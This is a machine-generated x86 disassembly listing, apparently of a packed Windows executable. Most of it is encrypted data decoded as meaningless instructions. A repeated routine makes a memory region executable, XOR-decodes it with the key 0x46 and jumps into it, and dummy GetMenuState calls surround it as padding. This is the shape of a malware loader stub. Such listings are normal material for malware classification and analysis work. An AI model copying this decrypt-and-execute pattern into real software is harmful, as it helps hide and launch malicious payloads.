push sub_4660b0
retn
mov eax rw-data
call sub_40cd80
sub_4660b4
sub [ rw-data ] 0x1
jae r-xdata
retn
mov ecx [ rw-data ]
mov ecx [ ecx ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_463f08
mov [ rw-data ] eax
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_413250
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_413250
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_413250
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_413250
sub_46611c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
movsb [ edi ] [ esi ]
arpl [ esi ] ax
pop eax
bound eax [ esi ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop edi
arpl [ esi ] ax
xor al 0x3
add [ eax ] al
int3
sub_466141
inc esp
inc ebp
add al dh
0x71ec0041 0x45
mov al [ 0xffffffffc8004573 ]
xor al 0x40
add [ eax + ebx * 4 ] cl
inc ebp
add [ edx + esi ] al
inc eax
add [ eax ] ah
xor al [ eax ]
or [ ebp + eax * 2 ] dh
adc [ edx + 0x44 ] dl
add [ eax + 0x79 ] bh
inc ebp
add [ edi + edi + 0x75c80041 ] al
inc ebp
add [ esi + esi * 2 ] al
inc ebp
add [ eax ] dl
ja r-xdata
xchg esp eax
add [ esp + ebx * 8 - 0x64f7ffbd ] ch
inc ecx
add [ eax - 0x17ffba81 ] cl
xchg edi eax
inc ecx
add [ eax ] ch
mov ebx 0x70600045
inc ebp
add [ ecx * 2 + 0x52400044 ] ah
inc esp
add [ ecx + edx * 2 - 0x2df7ffbc ] cl
inc ebx
add [ eax + 0x68004447 ] ah
jl r-xdata
push 0x6c00456e
xchg [ ebp ] al
cwde
sbb eax [ eax + eax + 0x30 ]
xchg ebx eax
inc ebp
add [ eax + 0x4c004596 ] dl
xchg ebp eax
inc ebp
add [ eax ] dh
sbb al 0x44
add [ esp + ebx ] dh
inc esp
add al cl
xchg edi eax
inc ebp
add [ edx + ebx + 0x470c0044 ] dl
inc esp
add [ esi + ebx * 4 + 0x59000045 ] bh
inc esp
add [ eax - 0x2fffbbbd ] cl
mov bl 0x45
add [ eax + ebp * 2 + 0x45 ] bl
add [ ebx + ebp * 2 ] cl
inc ebp
add [ eax - 0x13ffba5c ] dh
je r-xdata
fadd [ ebx ]
int3
add al bl
inc esp
inc esp
add [ eax - 0x2f ] dl
inc ebx
add [ ecx + edx * 8 + 0x43 ] dl
add [ ebp + edi * 2 + 0x45 ] bl
add al cl
add [ eax + eax - 0x6c ] eax
add [ eax ] al
add al [ eax ]
or edx [ edx + 0x61 ]
add [ eax + 0x75 ] ch
inc ebp
add [ eax + 0x240045b7 ] dh
jb r-xdata
add eax [ eax ]
add [ edx ] cl
add [ edx ] cl
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc edx
popad
jb r-xdata
outsd
jne r-xdata
add [ edx + esi * 4 - 0x666bffbb ] dh
inc ebp
add [ eax - 0x4c ] ch
inc ebp
add [ edi + edi * 2 + 0x45 ] cl
add [ edi ] cl
add [ esi + 0x63 ] ah
inc esi
add al bh
add al [ eax ]
add [ eax ] al
add [ edi ] al
inc edx
jne r-xdata
je r-xdata
and al 0x3
add [ eax ] al
or [ eax ] eax
or [ ebx + 0x70 ] edx
add [ edi ] al
or [ ebx ] al
add [ eax ] al
add al 0x0
or [ ebx + 0x6f ] eax
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
or [ ebx + 0x70 ] edx
insb
imul esi [ esp + esi * 2 + 0x65 ] 0x3203172
xor [ ebx + eax ] eax
add [ eax ] al
add eax [ eax ]
or dl [ ebx + 0x63 ]
jb r-xdata
outsb
je r-xdata
je r-xdata
add [ eax ] al
mov eax eax
outsb
xor [ eax ] esi
add eax [ eax ]
add [ 0x614d0900 ] cl
jae r-xdata
outsd
jb r-xdata
outsd
insb
inc edx
popad
jb r-xdata
insb
inc edx
outsd
js r-xdata
sbb [ ebx ] al
add [ eax ] al
or [ eax ] al
push cs
inc esp
push ebx
jb r-xdata
jbe r-xdata
or al 0x3
add [ eax ] al
add eax 0x6f500a00
jo r-xdata
add [ edx + esi + 0x373c0046 ] dh
inc esi
add [ eax ] bh
jne r-xdata
insb
insb
imul esi [ esp + esi * 2 + 0x65 ] 0x3283272
add [ eax ] al
or eax [ eax ]
or eax [ ebx + 0x6f ]
outsd
outsb
insb
imul esp [ ebp + 0x6e ] 0x6e6f4374
inc ebx
imul ebp [ fs : edi + 0x47 ] 0x70756f72
outsb
xor esp edi
add al [ eax ]
add [ ecx ] al
add [ ebx ] cl
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul esi [ ebx + 0x74 ] 0x30031
add [ edx ] al
add [ ebx ] cl
push edx
popad
inc ebp
imul esi [ fs : ecx + esi + 0x6 ] 0x726f4654
nop
nop
test ebx ebx
je r-xdata
xor [ ecx + 0x46 ] esp
add [ esi + eax * 2 ] dl
inc ebp
add [ esi ] bl
add eax 0x74696e55
xor [ eax ] eax
add [ ebx - 0x74a9ac40 ] cl
inc ebx
add [ eax - 0x2c ] dh
inc esp
add [ ebx + eax + 0x43 ] al
0x6e200044 0x42
or [ 0x12040043 ] ch
sub al 0x3
inc ebx
add [ edx + ebx * 4 + 0x6e200044 ] cl
inc edx
add [ eax ] cl
sub eax 0x12040043
adc [ esi ] bl
jb r-xdata
outsb
je r-xdata
inc ebx
outsd
jo r-xdata
mov edx ebx
test edx edx
jb r-xdata
add al cl
xor al 0x45
add [ eax ] dh
jl r-xdata
push r-xdata
call sub_466400
salc
salc
salc
salc
salc
salc
salc
salc
lds eax [ edx + 0x623ac556 ]
pop edx
inc esi
iretd
nop
lea eax [ ebp - 0x8 ]
push eax
push 0x40
push 0x5d12
push ebx
call [ rw-data ]
mov edx 0x5d12
mov eax ebx
call sub_4663c0
add ebx 0x3dd0
mov [ ebp - 0x4 ] ebx
jmp [ ebp - 0x4 ]
push 0x0
push 0x0
push 0x0
call GetMenuState
pop esi
pop ebx
retn
inc edx
xor eax eax
inc edx
jne r-xdata
add [ eax ] al
or al 0x0
or al 0x53
jo r-xdata
je r-xdata
add [ eax ] al
or al [ eax ]
or dl [ ebx + 0x63 ]
jb r-xdata
outsb
jne r-xdata
dec edx
jne r-xdata
rcl [ eax + 0x300c8d90 ] 0x8a
or [ eax + 0x1c8d46f1 ] eax
xor [ eax + 0x4090900b ] cl
add al cl
0x42
nop
nop
lea ecx [ eax + esi ]
mov cl [ ecx ]
xor cl 0x46
lea ebx [ eax + esi ]
mov [ ebx ] cl
nop
nop
inc eax
fimul [ ebx + 0x6a006af0 ]
add [ edx ] ch
call GetMenuState
rcl [ ebx + 0x56 ] 0x8b
insd
xor [ esi ] ecx
add [ eax ] dl
push ds
imul esi [ ecx + esi + 0x6 ] 0x726f4654
insd
xor [ ebx + eax ] ebx
add [ eax ] al
or [ eax ] eax
jb r-xdata
add [ esi ] cl
inc esp
inc ebx
adc [ ebx ] al
add [ eax ] al
push es
add [ esi ] al
dec esp
popad
bound esp [ ebp + 0x6c ]
xor [ ebx + eax ] edx
add [ eax ] al
pop es
sub_4663c0
push ebx
push esi
mov ebx edx
mov esi eax
push 0x0
push 0x0
push 0x0
call GetMenuState
mov edx ebx
test edx edx
jb r-xdata
push 0x0
push 0x0
push 0x0
call GetMenuState
pop esi
pop ebx
retn
inc edx
xor eax eax
nop
nop
lea ecx [ eax + esi ]
mov cl [ ecx ]
xor cl 0x46
lea ebx [ eax + esi ]
mov [ ebx ] cl
nop
nop
inc eax
dec edx
jne r-xdata
sub_466400
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx [ ebp + 0x8 ]
nop
cmp [ rw-data ] 0x0
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
nop
nop
test ebx ebx
je r-xdata
push r-xdata
call sub_466400
salc
salc
salc
salc
salc
salc
salc
salc
lds eax [ edx + 0x623ac556 ]
pop edx
inc esi
iretd
nop
lea eax [ ebp - 0x8 ]
push eax
push 0x40
push 0x5d12
push ebx
call [ rw-data ]
mov edx 0x5d12
mov eax ebx
call sub_4663c0
add ebx 0x3dd0
mov [ ebp - 0x4 ] ebx
jmp [ ebp - 0x4 ]
sub_4664af
inc esi
inc esi
inc esi
push ss
inc edx
inc edi
inc esi
inc esi
scasd [ edi ]
fdiv [ ebx + 0x46 ]
inc esi
int 0xaa
lds edi [ ebx ]
dec edx
inc esi
scasd [ edi ]
retn
sub_4664ca
out dx al
push cs
inc esi
inc esi
jg r-xdata
sub [ eax ] ah
iretd
mov esi 0x461c7baf
inc esi
salc
salc
salc
salc
push ss
scasd [ edi ]
xor [ esi + 0x46 ] ah
inc esi
salc
salc
dec ecx
retn
sub_466535
inc esi
inc esi
lds esp [ edx ]
bound ebp [ edx + 0x46 ]
adc [ eax + 0x47526202 ] al
scasb [ edi ]
pushfd
jns r-xdata
stosb [ edi ]
dec edx
adc eax 0x467e48af
inc esi
adc ecx ebp
stosb [ edi ]
scasd [ edi ]
aam 0x42
inc esi
inc esi
salc
salc
salc
salc
salc
salc
dec ecx
int1
push edx
aaa
lds eax [ esi + edx * 4 - 0x50b0433b ]
jle r-xdata
inc esi
pop ds
adc bh cl
add ah [ edx + 0x72 ]
scasb [ edi ]
pop ss
inc esi
inc esi
lds esp [ edx ]
bound esp [ edx + 0x46 ]
pop ds
iretd
inc esi
scasd [ edi ]
dec ebp
pop esi
inc esi
inc esi
salc
salc
salc
salc
salc
salc
inc esi
and bh cl
add esi [ esi + 0x20362c1e ]
iretd
salc
salc
salc
salc
salc
salc
salc
salc
and bl al
js r-xdata
rcr [ esi + eax * 2 ] 0x46
sub al 0x42
inc esi
jbe r-xdata
adc edi ecx
rol dl 0x46
inc esi
inc esi
scasb [ edi ]
call 0x2e8cac7c
mov ecx [ edx - 0x30ee7fce ]
ror dh 0x46
inc esi
inc esi
scasb [ edi ]
fisttp [ eax + 0x46 ]
inc esi
r-xdata
inc esi
inc esi
inc edi
inc esi
inc esi
sub al 0x46
mov ecx 0xc3b6cd95
mov al 0x49
retn 0x67cc
salc
salc
salc
salc
salc
salc
adc eax 0x5950ae10
inc esi
inc esi
scasd [ edi ]
inc ebp
push eax
inc esi
inc esi
salc
salc
push ss
int 0x80
scasd [ edi ]
sub edx [ esi + eax * 2 ]
inc esi
salc
salc
salc
salc
r-xdata
insb
aam 0x11
iretd
sub_46656e
xchg [ edi + 0x464603ed ] ch
salc
salc
salc
salc
inc esi
mov [ esi + 0x46 ] 0xaf
pop esp
insb
inc esi
inc esi
salc
salc
salc
salc
salc
salc
salc
int 0xaa
lds ebp [ edx + 0x48af154a ]
jle r-xdata
rcr [ esi + eax * 2 ] 0x46
sub al 0x42
inc esi
jbe r-xdata
inc esi
adc ecx ebp
stosb [ edi ]
scasd [ edi ]
aam 0x42
inc esi
inc esi
salc
salc
salc
salc
salc
salc
dec ecx
int1
push edx
aaa
lds eax [ esi + edx * 4 - 0x50b0433b ]
jle r-xdata
rol dl 0x46
inc esi
inc esi
scasb [ edi ]
call 0x2e8cac7c
mov ecx [ edx - 0x30ee7fce ]
ror dh 0x46
inc esi
inc esi
scasb [ edi ]
fisttp [ eax + 0x46 ]
inc esi
r-xdata
inc esi
inc esi
inc edi
inc esi
inc esi
sub al 0x46
mov ecx 0xc3b6cd95
mov al 0x49
retn 0x67cc
inc esi
scasd [ edi ]
dec ebp
pop esi
inc esi
inc esi
salc
salc
salc
salc
salc
salc
inc esi
and bh cl
add esi [ esi + 0x20362c1e ]
iretd
salc
salc
salc
salc
salc
salc
adc eax 0x5950ae10
inc esi
inc esi
scasd [ edi ]
inc ebp
push eax
inc esi
inc esi
salc
salc
push ss
int 0x80
scasd [ edi ]
sub edx [ esi + eax * 2 ]
inc esi
salc
salc
salc
salc
r-xdata
insb
aam 0x11
iretd
salc
salc
salc
salc
salc
salc
salc
salc
and bl al
js r-xdata
adc edi ecx
sub_4665d4
add edi [ esp + ebp + 0x1cc1af23 ]
inc esi
inc esi
rol dl 0x46
inc esi
inc esi
scasb [ edi ]
call 0x2e8cac7c
mov ecx [ edx - 0x30ee7fce ]
ror dh 0x46
inc esi
inc esi
scasb [ edi ]
fisttp [ eax + 0x46 ]
inc esi
r-xdata
inc esi
inc esi
inc edi
inc esi
inc esi
sub al 0x46
mov ecx 0xc3b6cd95
mov al 0x49
retn 0x67cc
salc
salc
salc
salc
salc
salc
adc eax 0x5950ae10
inc esi
inc esi
scasd [ edi ]
inc ebp
push eax
inc esi
inc esi
salc
salc
push ss
int 0x80
scasd [ edi ]
sub edx [ esi + eax * 2 ]
inc esi
salc
salc
salc
salc
r-xdata
insb
aam 0x11
iretd
salc
salc
salc
salc
salc
salc
salc
salc
and bl al
js r-xdata
sub al 0x42
inc esi
jbe r-xdata
rcr [ esi + eax * 2 ] 0x46
adc edi ecx
sub_4665f5
inc esi
inc esi
scasd [ edi ]
dec ebp
pop esi
inc esi
inc esi
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
and bl al
js r-xdata
rcr [ esi + eax * 2 ] 0x46
sub al 0x42
inc esi
jbe r-xdata
adc edi ecx
rol dl 0x46
inc esi
inc esi
scasb [ edi ]
call 0x2e8cac7c
mov ecx [ edx - 0x30ee7fce ]
ror dh 0x46
inc esi
inc esi
scasb [ edi ]
fisttp [ eax + 0x46 ]
inc esi
r-xdata
inc esi
inc esi
inc edi
inc esi
inc esi
sub al 0x46
mov ecx 0xc3b6cd95
mov al 0x49
retn 0x67cc
salc
salc
salc
salc
salc
salc
adc eax 0x5950ae10
inc esi
inc esi
scasd [ edi ]
inc ebp
push eax
inc esi
inc esi
salc
salc
push ss
int 0x80
scasd [ edi ]
sub edx [ esi + eax * 2 ]
inc esi
salc
salc
salc
salc
r-xdata
insb
aam 0x11
iretd
sub_4666b9
inc esi
inc esi
scasd [ edi ]
stc
imul eax [ esi + 0x46 ] 0x4e33b9d6
scasd [ edi ]
mov [ edx + 0x46 ] ecx
inc esi
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
int 0x9e
jne r-xdata
dec eax
inc esi
inc esi
pop eax
outsd
dec eax
int1
adc edi ecx
shr dh 0x46
inc esi
inc esi
scasb [ edi ]
pop ds
dec eax
inc esi
inc esi
lds eax [ edx + 0x77952e06 ]
adc [ eax ] 0x11
scasd [ edi ]
fcomp [ edi + 0x46 ]
inc esi
salc
salc
salc
salc
salc
salc
salc
salc
and bl al
scasd [ edi ]
out dx al
adc al 0x46
inc esi
dec ecx
retn 0x66d0
sub_466762
inc esi
inc esi
inc esi
push ss
scasb [ edi ]
jpo r-xdata
sub ecx ebp
xchg esi eax
scasd [ edi ]
fwait
jo r-xdata
inc esi
inc esi
lds eax [ edx + 0x4986c34a ]
retn 0x72be
inc esi
pop ds
retn
inc esi
salc
salc
salc
salc
salc
salc
salc
adc bl cl

sub_466774
inc esi
inc esi
sub al 0x29
push ds
sub al 0x36
and bh cl
add ah [ edx + 0x7a ]
push ds
sub al 0x23
and bh cl
add ah [ edx + 0x78 ]
push ds
sub al 0x28
and bh cl
add ah [ edx + 0x6 ]
push ds
sub al 0x47
and bh cl
add ah [ edx + 0x4 ]
jne r-xdata
iretd
push ss
push ss

sub_4667a0
inc esi
inc esi
inc esi
pop ss
scasd [ edi ]
r-xdata
sbb [ eax + 0x46 ] dh
inc esi
pop ds
pop ds
retn
inc esi
salc
salc
salc
scasb [ edi ]
xchg ebp eax
pop eax
inc esi
inc esi
int 0xbe
retn
sub_4667b4
mov ecx 0xb9b96daf
mov ecx 0xd6d6d6d6
salc
salc
salc
salc
salc
scasb [ edi ]
dec eax
inc esi
inc esi
lds eax [ edx + 0x6a59af52 ]
inc esi
inc esi
salc
and bh cl
add ebx [ esi - 0x32d4d3e2 ]
xchg esi eax
scasd [ edi ]
fwait
jo r-xdata
inc esi
pop ds
retn
inc esi
salc
salc
salc
salc
salc
salc
salc
adc bl cl

sub_4667f5
xchg [ ecx - 0x3e ] cl
dec ebx
mov ecx 0x8675b9b9
scasd [ edi ]
mov eax 0xd646467b
int 0x80
and bh cl
add edx [ eax + 0x464c6daf ]
inc esi
scasd [ edi ]
out dx eax
dec esi
inc esi
inc esi
dec ecx
retn
sub_46683c
inc esi
inc esi
sub al 0x46
mov ecx 0x4646ead0
inc esi
scasd [ edi ]
push ebx
inc esi
inc esi
salc
salc
pop ds
inc esi
mov [ esi + 0x46 ] 0x2c
inc esi
mov ecx 0xaf6e6232
xchg esp eax
inc ebp
inc esi
inc esi
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
iretd
sub_46687b
cmp edi [ edx + 0x46cad0b9 ]
inc esi
inc esi
scasd [ edi ]
push cs
inc esi
inc esi
scasd [ edi ]
ficomp [ eax + 0x46 ]
inc esi
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
dec ecx
retn
sub_4668ff
inc esi
inc esi
jg r-xdata
inc esi
inc esi
salc
salc
dec ecx
[ edx - 0x47 ] eax
add ah [ edx + 0x5e ]
jg r-xdata
dec esi
dec ecx
retn 0x4b61
dec ecx
bound ebx [ esi + 0x49 ]
sub_466980
add ebp [ edx - 0x7d3c34ea ]
mov edx 0x6bafb9b9
jle r-xdata
inc esi
inc esi

inc esi
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
and bh cl
cmp esp [ esi - 0x6e50468b ]
or [ esi + 0x46 ] eax
salc
retn
sub_4669bd
xchg [ ecx - 0x3e ] cl
cmpsb [ esi ] [ edi ]
imul eax [ esi + 0x46 ] 0x4669e2af
inc esi
salc
salc
jg r-xdata
xor [ esi ] dl
scasd [ edi ]
or eax 0x2e46466d
stosd [ edi ]
mov ebp 0xaf10d025
call 0xffffffffd68cb07b
salc
salc
salc
dec ecx
retn 0x5b18
bound esp [ esi + 0x49 ]
retn 0x8fa
sub_4669f7
mov al 0x3
inc esi
inc esi
lds ecx [ esi - 0x29297a47 ]
salc
salc
mov ecx 0x30b91a11
push ss
scasd [ edi ]
or eax 0x2e46466d
stosd [ edi ]
mov ebp 0xaf10d025
call 0xffffffffd68cb07b
salc
salc
salc
dec ecx
retn 0x5b18
sub_466a21
inc esi
inc esi
scasd [ edi ]
mov ebp 0xd6d6b9b9
salc
salc
salc
salc
lds ebp [ edx + 0x11101566 ]
scasd [ edi ]
xor eax 0xd6b9b9bb
salc
salc
salc
salc
salc
salc
lds eax [ edx + 0x4986c352 ]
retn 0x50c1
sub_466ac6
add esi [ esi + ebx - 0x4dfc30e0 ]
sub al 0x23
push ds
and bh cl
add esi [ eax - 0x50e1cbd4 ]
adc [ edx + 0x46 ] bl
inc esi
salc
salc
int 0x36
jpe r-xdata
iretd
mov dh 0xc7
js r-xdata
push esi
inc esi
inc esi
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
sbb al 0x2c
and ah [ eax ]
iretd
add eax [ esi + 0x46 ]
dec ecx
retn
sub_466aeb
into
jbe r-xdata
inc esi
salc
push es
scasd [ edi ]
cdq
dec esi
inc esi
inc esi
salc
salc
salc
salc
salc
salc
mov ecx 0x33b97230
mov [ 0x465cc1af ] al
inc esi
salc
lds eax [ edx - 0x4d3f30a2 ]
inc esi
inc esi
inc esi
scasd [ edi ]
mov ah 0x66
inc esi
inc esi
salc
sbb [ eax ] ebx
scasd [ edi ]
not [ esi + eax * 2 ]
inc esi
salc
salc
salc
salc
and ch al
jle r-xdata
inc esi
scasd [ edi ]
sub dh [ ecx + 0x46 ]
inc esi
scasb [ edi ]
mov [ esi + eax * 2 + 0x46 ] es
pop ds
scasd [ edi ]
sbb [ esi + 0x46 ] dl
inc esi
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
sbb al 0x2c
and ah [ eax ]
iretd
add [ esi + 0x46 ] al
salc
salc
salc
salc
salc

scasd [ edi ]
lahf
inc ecx
inc esi
inc esi
int 0x9e
retn
sub_466b28
add ebp [ eax ]
and bh cl
adc esp [ eax ]
int 0x96
scasd [ edi ]
test [ ebx + 0x46 ] edi
inc esi
salc
push es
scasd [ edi ]
cdq
dec esi
inc esi
inc esi
salc
salc
salc
salc
salc
salc
mov ecx 0x33b97230
mov [ 0x465cc1af ] al
inc esi
salc
lds eax [ edx - 0x4d3f30a2 ]
inc esi
inc esi
inc esi
scasd [ edi ]
mov ah 0x66
inc esi
inc esi
salc
sbb [ eax ] ebx
scasd [ edi ]
not [ esi + eax * 2 ]
inc esi
salc
salc
salc
salc
and ch al
jle r-xdata
add [ esi + 0x46 ] al
salc
salc
salc
salc
salc

scasd [ edi ]
lahf
inc ecx
inc esi
inc esi
int 0x9e
retn
sub_466b79
inc esi
inc esi
imul ebx [ cs : edi ] 0xcf15d8a3
fcom [ esi - 0x51b9b9ba ]
adc ecx [ edi + 0x46 ]
inc esi
scasd [ edi ]
sub eax 0xd6464649
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
adc ecx ebp
stosb [ edi ]
lds ebp [ edx + 0x77bbaf4a ]
inc esi
inc esi
scasd [ edi ]
outsd
add [ esi + 0x46 ] al
salc
salc
salc
salc
salc

sub_466bbc
mov esi 0xaeb9b9bb
insd
inc ecx
inc esi
inc esi
int 0x13
dec edx
scasb [ edi ]
fnstsw [ ecx - 0x50e94647 ]
test [ eax + 0x46 ] ecx
inc esi
sbb eax 0xd6d6858f
salc
dec ecx
retn 0x52b5
sub_466bfa
sti
mov esp 0xbcdb9b9
mov edx 0x460d2daf
inc esi
lds edi [ esi + 0xaf2afb9 ]
inc esi
inc esi
salc
salc
salc
salc
salc
salc
salc
salc
dec ecx
retn
sub_466c1a
inc esi
inc esi
scasd [ edi ]
out dx eax
jne r-xdata
add eax 0x35b91658
push ds
int 0x80
adc [ esi + 0x464667d2 ] ebp
lds eax [ edx + 0x6202cf56 ]
retn
inc esi
salc
sbb al 0x2c
and al 0x20
iretd
sub_466c27
adc edi eax
sbb al 0xaf
daa
pop edi
inc esi
inc esi
salc
mov ecx 0x2cd3210
bound edx [ esi + 0x47 ]
add ah [ edx + 0x5e ]
mov ecx 0xcd5a6202
add ah [ edx + 0x5a ]
jge r-xdata
mov ecx 0x49b9c3b9
retn 0xb38
pop esi
dec ecx
les esp [ ecx ]
mov edx 0xb9c3b9b9
dec ecx
sub_466c84
or eax 0x26af170e
je r-xdata
mov ecx 0xd6d6d6b9
salc
salc
salc
salc
salc
salc
dec ecx
int1
push edi
adc eax 0xaf87cd10
push ecx
jle r-xdata
inc esi
salc
salc
salc
salc
sbb eax [ ebp - 0x2929292a ]
salc
salc
and bh cl
add ebx [ edi + ebp * 4 + 0x46466f5a ]
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
scasb [ edi ]
jge r-xdata
and bh cl
cmp esi [ eax - 0x3287ec31 ]
mov esi 0x46094faf
inc esi
salc
salc
salc
salc
adc edi ecx
add [ edx ] ah
scasb [ edi ]
fiadd [ ecx + 0x46 ]
inc esi
lodsd [ cs : esi ]
inc edi
psrld mm2 [ ecx ]
iretd
inc esi
salc
scasd [ edi ]
or bl [ ebx + 0x46 ]
inc esi
salc
salc
salc
salc
salc
salc
salc
salc
salc
mov ecx 0x33b9ba33
mov [ 0xffffffffaf5a11b9 ] al
xor eax 0xd6b9b9be
salc
salc
pop [ ebp - 0x2929292a ]
salc
salc
salc
dec ecx
retn 0x4645
inc esi
inc esi
scasd [ edi ]
dec ebp
push 0xd6d64646
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
dec ecx
retn
sub_466cca
out dx eax
push 0x4daf4646
mov eax 0xd6d6b9b9
salc
salc
salc
salc
salc
salc
salc
dec ecx
int1
push edi
adc eax 0xaf87cd10
push ecx
jle r-xdata
and bh cl
cmp esi [ eax - 0x3287ec31 ]
mov esi 0x46094faf
inc esi
salc
salc
salc
salc
adc edi ecx
add [ edx ] ah
scasb [ edi ]
fiadd [ ecx + 0x46 ]
inc esi
lodsd [ cs : esi ]
inc edi
psrld mm2 [ ecx ]
iretd
inc esi
salc
scasd [ edi ]
or bl [ ebx + 0x46 ]
inc esi
salc
salc
salc
salc
salc
salc
salc
salc
salc
mov ecx 0x33b9ba33
mov [ 0xffffffffaf5a11b9 ] al
xor eax 0xd6b9b9be
salc
salc
pop [ ebp - 0x2929292a ]
salc
salc
salc
dec ecx
retn 0x4645
sub_466d6b
add esp [ esi + 0x7646af16 ]
inc esi
inc esi
salc
salc
and bh cl
sbb ebp esi
sbb eax 0xec1bcf20
int 0x9f
sub al 0x25
and bh cl
sbb ebp edx
sbb eax 0xe81bcf20
sub al 0x35
and bh cl
or edi eax
pop ds
sub al 0x32
and bh cl
or eax [ edi + ebx - 0x30dfccd4 ]
clc
sar [ edx - 0x46b9b9ba ] 0x1
jo r-xdata
or eax [ edx - 0x30df6633 ]
sbb esi esi
int 0x9e
pop ds
scasd [ edi ]
mov dh 0x75
inc esi
inc esi
scasb [ edi ]
xor eax 0xb9464651
xor ecx [ edx - 0x51 ]
inc ecx
mov edi 0xd6d6b9b9
salc
salc
salc
salc
salc
salc
salc
scasb [ edi ]
mov ecx 0x45464605
xchg [ esi ] dl
pop ss
sub al 0x47
sub al 0x46
mov ecx 0xb9526232
jo r-xdata
pop ds
sub al 0x33
and bh cl
shl [ edx - 0x7ab9b9ba ] 0x1
salc
sbb eax 0x4667b1af
inc esi
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
sub al 0x33
sbb [ eax ] esp
iretd
sub_466e14
cmp edi edx
int 0xb8
and bh cl
cmp edi eax
scasd [ edi ]
jo r-xdata
jge r-xdata
inc esi
inc esi
salc
salc
salc
sub al 0x42
inc esi
jbe r-xdata
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
sub al 0x33
sbb [ eax ] esp
iretd
dec ecx
retn 0x497e
salc
salc
salc
salc
salc
salc
scasb [ edi ]
or al [ 0xffffffff857d4646 ]
inc esi
scasd [ edi ]
pushad
or al [ esi + 0x46 ]
dec ecx
retn 0x78dc
sub_466e34
inc esi
inc esi
adc eax 0x2f5bb72e
push es
mov ecx 0x464682f0
inc esi
scasd [ edi ]
add edi [ ebx + 0x46 ]
inc esi
int 0xb
mov edx 0x46446aaf
inc esi
salc
salc
salc
salc
salc
salc
salc
adc eax 0xc3cb1515
mov ebx 0xaf16b9b9
xor bh [ edi + 0x46 ]
inc esi
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
scasb [ edi ]
or al [ 0xffffffff857d4646 ]
dec ecx
retn 0x497e
sub_466e99
mov esi 0xaeb9b9bb
pop eax
jpo r-xdata
mov ebx 0xaf16b9b9
popad
bound eax [ esi + 0x46 ]
salc
salc
salc
salc
salc
salc
salc
salc
salc
jne r-xdata
inc esi
int 0xc0
cli
inc esi
inc esi
inc esi
int 0xc8
xchg [ esi + 0x46 ] al
inc esi
das
xchg dl al
inc esi
inc esi
inc esi
int 0xd3
0xcfb9b9bb 0x4ed2
mov [ esi + 0x46 ] 0x46
int 0xc0
inc esi
inc esi
scasd [ edi ]
aad 0x7
inc esi
inc esi
salc
dec ecx
les ecx [ esi + 0x46 ]
inc esi
inc esi
sub al 0x46
mov ecx 0x4646ead0
inc esi

push es
pop [ ebp - 0x42507133 ]
inc ebp
inc esi
inc esi
salc
salc
salc
jne r-xdata
cli
inc esi
inc esi
inc esi
das
xchg dl al
inc esi
inc esi
inc esi
inc ebp
rol [ esi - 0x34b9b9ba ] 0xcb
mov esi 0xaeb9b9bb
push esp
inc edx
inc esi
inc esi
mov ecx 0x4646fac0
inc esi

int 0x32
sti
mov [ 0x1bcd8f75 ] al
mov dl 0xcd
nop
xchg ebp eax
mov esp 0xc5b203b9
xchg [ esi - 0x32 ] ecx
adc bl [ ebx - 0x7e ]
scasd [ edi ]
pop edx
popad
inc esi
inc esi
salc
and bh cl
add ebp [ eax - 0x32d7d3e2 ]
mov fs [ eax ]
iretd
sub_466ee6
xchg edx eax
mov ebx 0xaf16b9b9
popad
bound eax [ esi + 0x46 ]
salc
salc
salc
salc
salc
salc
salc
salc
salc
jne r-xdata
inc esi
inc esi
scasd [ edi ]
aad 0x7
inc esi
inc esi
salc
dec ecx
les ecx [ esi + 0x46 ]
inc esi
inc esi
sub al 0x46
mov ecx 0x4646ead0
inc esi

push es
pop [ ebp - 0x42507133 ]
inc ebp
inc esi
inc esi
salc
salc
salc
jne r-xdata
cli
inc esi
inc esi
inc esi
das
xchg dl al
inc esi
inc esi
inc esi
inc ebp
rol [ esi - 0x34b9b9ba ] 0xcb
mov esi 0xaeb9b9bb
push esp
inc edx
inc esi
inc esi
mov ecx 0x4646fac0
inc esi

int 0x32
sti
mov [ 0x1bcd8f75 ] al
mov dl 0xcd
nop
xchg ebp eax
mov esp 0xc5b203b9
xchg [ esi - 0x32 ] ecx
adc bl [ ebx - 0x7e ]
scasd [ edi ]
pop edx
popad
inc esi
inc esi
salc
and bh cl
add ebp [ eax - 0x32d7d3e2 ]
mov fs [ eax ]
iretd
sub_466f39
or esi [ edi + ebx - 0x655097d4 ]
mov cl 0xb9
mov ecx 0xddaed6d6
inc esi
inc esi
mov cl 0x9e
scasd [ edi ]
